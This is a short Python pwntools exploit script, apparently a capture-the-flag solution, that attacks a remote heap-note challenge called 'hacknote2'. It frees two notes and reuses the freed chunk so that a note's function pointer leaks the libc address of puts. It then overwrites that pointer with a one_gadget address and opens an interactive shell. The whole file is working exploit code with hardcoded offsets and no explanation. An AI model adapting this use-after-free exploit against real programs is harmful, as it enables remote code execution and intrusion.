from pwn import *

context.arch = "amd64"
context.terminal = ['tmux', 'splitw', '-h']

#r = process('./hacknote2')
#gdb.attach(proc.pidof(r)[0])
r = remote("csie.ctf.tw", 10139)

def add_note(size, content):
    r.sendlineafter(':', "1")
    r.sendlineafter(':', str(size))
    r.sendlineafter(':', content)

def del_note(index):
    r.sendlineafter(':', "2")
    r.sendlineafter(':', str(index))

def print_note(index):
    r.sendlineafter(':', "3")
    r.sendlineafter(':', str(index))

print_note_content = 0x400886
puts_got = 0x602028
one_gadget = 0xf0274

add_note(0x50, "jedi")
add_note(0x50, "jedi")
del_note(0)
del_note(1)
add_note(16, p64(print_note_content) + p64(puts_got))
print_note(0)

r.recvuntil("Index :")
libc = u64(r.recvuntil('\n').strip().ljust(8, '\x00')) - 0x6f690

del_note(2)
add_note(16, p64(libc + one_gadget))
print_note(0)

r.interactive()
